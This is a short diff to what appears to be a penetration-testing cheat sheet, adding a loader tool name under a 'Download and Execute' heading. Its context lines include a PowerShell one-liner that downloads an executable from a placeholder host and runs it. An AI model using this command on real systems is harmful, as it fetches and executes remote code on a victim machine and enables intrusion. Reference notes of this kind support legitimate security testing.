@@ -15,6 +15,8 @@ $p = [System.Diagnostics.Process]::Start($si);
 # Download and Execute
 Good reference for many ways:  https://www.greyhathacker.net/?p=500
 
+rmudge_loader.exe - runs executable
+
 ```text
 powershell (New-Object System.Net.WebClient).DownloadFile('http://<ip>',c:\temp\test.exe'); (New-Object -com Shell.Application).ShellExecute('c:\temp\test.exe');
 
